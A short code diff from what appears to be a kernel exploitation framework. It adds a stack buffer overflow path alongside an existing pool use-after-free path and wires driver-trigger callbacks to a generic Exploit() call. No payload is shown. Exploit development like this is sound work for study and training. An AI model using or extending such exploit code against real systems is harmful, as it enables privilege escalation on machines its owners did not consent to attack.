@@ -21,9 +21,19 @@ int main() {
 	aek::ex.AllocateFakePool = _AllocateFakePool;
 	aek::ex.FreeTriggerPool = _FreeTriggerPool;
 	aek::ex.TriggerCallbackFunction = _TriggerCallbackFunction;
+	aek::ex.SetChunkSize(CHUNK_SIZE);
 	aek::ex.Exploit();
 
 #endif // NPP_UAF
+
+#ifdef BOF
+
+	CreateDevice();
+	aek::ex.SetDummySize(DUMMY_SIZE);
+	aek::ex.TriggerStackOverflow = _TriggerStackOverflow;
+	aek::ex.Exploit();
+
+#endif	// Stack BOF
 	
 	return 0;
 }
